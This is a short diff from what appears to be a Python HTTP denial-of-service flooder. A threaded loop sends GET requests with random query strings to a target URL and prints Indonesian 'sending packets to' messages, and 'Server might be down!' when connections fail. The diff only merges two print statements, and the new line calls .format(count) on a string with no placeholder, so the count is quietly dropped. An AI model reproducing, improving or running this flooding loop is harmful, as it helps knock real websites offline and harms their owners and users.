@@ -86,8 +86,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
-                print (format(count))
-                print("[+]\033[92mNOZZ: \033[93mMENGIRIM-PAKET ke \033[1m" +url+ "\033[0m" )
+                print("[+]\033[92mNOZZ: \033[97mMENGIRIM-PAKET ke \033[1m" +url+ "\033[0m" .format(count))
        
             except requests.exceptions.ConnectionError:
                 print ("[Server might be down!]")
